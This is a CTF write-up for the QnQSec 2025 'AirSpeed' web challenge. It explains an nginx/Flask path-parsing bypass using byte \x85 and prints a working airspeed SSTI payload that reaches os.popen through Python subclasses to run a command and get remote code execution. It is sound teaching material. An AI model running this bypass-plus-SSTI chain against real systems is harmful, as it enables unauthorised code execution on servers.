---
title: "AirSpeed"
slug: qnqsec-2025-airspeed
excerpt: "HTTP Parsing Discrepancy + Airspeed SSTI to RCE"
coverImage: "https://images.unsplash.com/photo-1562813733-b31f71025d54?w=800"
coverImageAlt: "AirSpeed - QnQSec CTF 2025 writeup"
categories:
  - QnQSec CTF 2025
  - Web
  - SSTI
  - HTTP Parsing
date: 2025-01-12
showToc: true
---

## Challenge Overview

This challenge provided us with a Flask web application setup including docker-compose.yml, nginx.conf, and application source code. The goal is to find and read the flag from the server.

## Initial Reconnaissance

### Analyzing the Nginx Configuration

```nginx
location = /debug {
    deny all;
    return 403;
}
```

The `/debug` endpoint is blocked at the nginx level.

### Source Code Review

The app uses the `airspeed` template engine (Python implementation of Apache Velocity).

```python
@app.route('/debug', methods=['POST'])
def debug():
    name = request.json.get('name', 'World')
    return airspeed.Template(f"Hello, {name}").merge({})
```

User input is directly embedded into the template string - classic SSTI vulnerability!

## Vulnerability Analysis

### The Access Control Issue

- **Nginx layer:** Blocks `/debug` endpoint -> Returns 403
- **Flask layer:** Has no restrictions on `/debug`

### Finding the HTTP Parsing Discrepancy

Testing various byte values revealed that byte `\x85` creates a parsing discrepancy:

- **Nginx perspective:** `/debug\x85` != `/debug` -> Allows through
- **Flask perspective:** `/debug\x85` = `/debug` -> Routes to debug endpoint

## Exploitation

### Server-Side Template Injection (SSTI)

Payload test: `#set( $foo = 7*7 )\n$foo`

```
HTTP/1.1 200 OK
Hello, 49
```

### Achieving RCE

The `jinja2.utils.Cycler` class gives access to `os.popen()` through `__init__.__globals__`:

```json
{
    "name": "#set($x='')\n#set($cycler=$x.__class__.__mro__[1].__subclasses__()[479])\n#set($init=$cycler.__init__)\n#set($globals=$init.__globals__)\n#set($os=$globals.os)\n#set($popen=$os.popen('/readflag'))\n$popen.read()"
}
```

## Flag

```
QnQSec{n0w_th1s_1s_th3_r34l_f14g}
```

## Key Takeaways

- HTTP parsing discrepancies between different web servers can create bypass opportunities
- Access controls should be implemented at multiple layers
- Never directly embed user input into template strings
